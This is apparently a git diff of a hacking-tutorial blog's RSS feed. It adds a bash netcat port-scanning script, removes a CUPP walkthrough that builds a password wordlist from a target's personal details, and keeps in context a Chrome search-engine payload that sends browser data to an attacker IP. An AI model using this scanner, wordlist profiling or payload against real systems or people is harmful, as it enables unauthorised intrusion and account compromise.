@@ -2,9 +2,64 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sun, 03 Jul 2016 01:14:01 +1000</lastBuildDate>
-<pubDate>Sun, 03 Jul 2016 01:14:01 +1000</pubDate>
+<lastBuildDate>Sat, 08 Oct 2016 19:38:12 +1100</lastBuildDate>
+<pubDate>Sat, 08 Oct 2016 19:38:12 +1100</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
+<item><title>
+Port Scanning With Netcat (Up to 1000pps)
+</title><description><![CDATA[
+
+<p><code></p>
+
+<div class="code">
+<com>nano catscan.sh</com>
+#!/bin/bash
+mkdir catscan-results
+cp targets.txt catscan-results
+cd catscan-results
+
+# Use ping to get IP addresses. Strip bash colours from output with sed
+echo "Generating IP list..."
+for host in $(cat targets.txt);do
+    hostip=`ping -c 1 -W 1 $host  | grep PING | cut -d"(" -f2 | cut -d")" -f1 | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"`
+    echo "$host resolves to $hostip" 
+    echo "$host resolves to $hostip" >> host-ip.txt 
+    echo $hostip >> temp-hosts.txt
+done
+wait
+
+# Sort ips and remove dupes
+sort -u temp-hosts.txt > hosts.txt
+rm temp-hosts.txt
+
+echo "Starting scan..."
+# Scan y ports at a time and ouput to results.txt
+# To change number of ports scanned at a time, change y, x incrementer, y incrementer
+for ip in $(cat hosts.txt);do
+    x=0
+    y=1000
+    while [ $y -le 66000 ];do
+        echo "Scanning $ip (Ports $x - $y)"
+        for num in $(seq $x $y);do
+            netcat -vzn -w 1 $ip $num >> results.txt 2>&1 &
+        done
+        wait
+        x=$(( $x + 1000 ))
+        y=$(( $x + 1000 ))
+        grep $ip results.txt | grep " open" results.txt | sort -u
+    done
+done
+grep $ip results.txt | grep " open" results.txt | sort -u > open-ports.txt
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_port-scanning.html'>port-scanning</a></p>
+<!-- text end -->
+]]></description><link>https://metalkey.github.io/port-scanning-with-netcat-up-to-1000pps.html</link>
+<guid>https://metalkey.github.io/./port-scanning-with-netcat-up-to-1000pps.html</guid>
+<dc:creator>metalkey</dc:creator>
+<pubDate>Sat, 08 Oct 2016 19:38:10 +1100</pubDate></item>
 <item><title>
 Google Chrome Search Poison – Default Search Engine Exploit
 </title><description><![CDATA[
@@ -79,12 +134,11 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 
 <p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
 
-
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/google-chrome-search-poison---default-search-engine-exploit.html</link>
 <guid>https://metalkey.github.io/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 20:37:36 +1000</pubDate></item>
+<pubDate>Sun, 03 Jul 2016 01:13:57 +1000</pubDate></item>
 <item><title>
 UnrealIRCD 3.2.8.1 Backdoor Command Execution
 </title><description><![CDATA[
@@ -193,7 +247,6 @@ root@metasploitable:/#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
-
 
 
 
@@ -609,7 +662,6 @@ Higher values can also be set and detailed instructions are available at Null By
 
 
 
-
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/increasing-the-power-output-of-your-alfa-awus036h.html</link>
 <guid>https://metalkey.github.io/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
@@ -679,7 +731,6 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 <p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-
 
 
 
@@ -765,120 +816,4 @@ Mode Size Type Last modified Name<br>
 <guid>https://metalkey.github.io/./metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:06:44 +1000</pubDate></item>
-<item><title>
-Password Profiling &amp; Wordlist Generation with CUPP (Common User Password Profiler)
-</title><description><![CDATA[
-
-<p><strong>OS:</strong> Debian 8<br>
-<br>
-CUPP was created by Muris Kurgas (aka j0rgan) from remote-exploit (<a href="http://remote-exploit.org/">http://remote-exploit.org/</a>) and is an excellent tool for password profiling and wordlist optimization.</p>
-
-<h2>Installation</h2>
-
-<p>To install, simply clone the git repo.
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>git clone https://github.com/Mebus/cupp.git</com><br>
-user@debian8:~$ <com>./cupp.py</com><br>
-<br>
-<com>-i</com> Interactive questions for user password profiling<br>
-<com>-w</com> Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce<br>
-<com>-l</com> Download huge wordlists from repository<br>
-<com>-a</com> Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which where merged and enhanced.<br>
-</div>
-
-<p></code></p>
-
-<h2>Password Profiling</h2>
-
-<p>In this example we will password profile the user "John Smith".<br>
-We have some basic information on this user and will fill out the appropriate fields.<br>
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>./cupp.py -i</com><br>
-<br>
-[+] Insert the informations about the victim to make a dictionary<br>
-[+] If you don't know all the info, just hit enter when asked! ;)<br>
-<br>
-> First Name: <com>John</com><br>
-> Surname: <com>Smith</com><br>
-> Nickname: <com>John</com><br>
-> Birthdate (DDMMYYYY): <com>12011955</com><br>
-<br>
-> Partners) name: <com>Mary</com><br>
-> Partners) nickname: <com>Mary</com><br>
-> Partners) birthdate (DDMMYYYY): <com>01031955</com><br>
-<br>
-> Child's name: <com>Mark</com><br>
-> Child's nickname: <com>Mark</com><br>
-> Child's birthdate (DDMMYYYY): <com>01011982</com><br>
-<br>
-> Pet's name: <com>Tim</com><br>
-> Company name: <com>Amazon</com><br>
-<br>
-> Do you want to add some key words about the victim? Y/[N]: <com>y</com><br>
-> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: <com>chelsea,football,beer,beatles</com><br>
-> Do you want to add special chars at the end of words? Y/[N]: <com>y</com><br>
-> Do you want to add some random numbers at the end of words? Y/[N]<com>y</com><br>
-> Leet mode? (i.e. leet = 1337) Y/[N]: <com>y</com><br>
-<br>
-[+] Now making a dictionary...<br>
-[+] Sorting list and removing duplicates...<br>
-[+] Saving dictionary to john.txt, counting 40248 words.<br>
-[+] Now load your pistolero with john.txt and shoot! Good luck! <br>
-</div>
-
-<p></code>
-Our 40,248 line wordlist has been generated and saved as "john.txt"
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>more john.txt</com><br>
-<br>
-...<br>
-395503<br>
-39551955<br>
-39551955<br>
-395555<br>
-...<br>
-4m420n<br>
-4m420n!<br>
-4m420n!!<br>
-4m420n!!!<br>
-...<br>
-B33r1955355<br>
-B33r195555<br>
-B33r1955551<br>
-B33r1955552<br>
-...<br>
-Ch3l5342101<br>
-Ch3l5342112<br>
-Ch3l534212<br>
-Ch3l5342121<br>
-...<br>
-j0hnSm17h48<br>
-j0hnSm17h49<br>
-j0hnSm17h5<br>
-j0hnSm17h50<br>
-...<br>
-</div>
-
-<p></code>
-This wordlist may prove useful when cracking hashes, capture files, etc…<br>
-You can also download wordlists and improve wordlists using the -w, -l and -a options.<br></p>
-
-<p>Tags: <a href='tag_password.html'>password</a></p>
-
-
-
-
-
-
-<!-- text end -->
-]]></description><link>https://metalkey.github.io/password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</link>
-<guid>https://metalkey.github.io/./password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</guid>
-<dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:03:26 +1000</pubDate></item>
 </channel></rss>
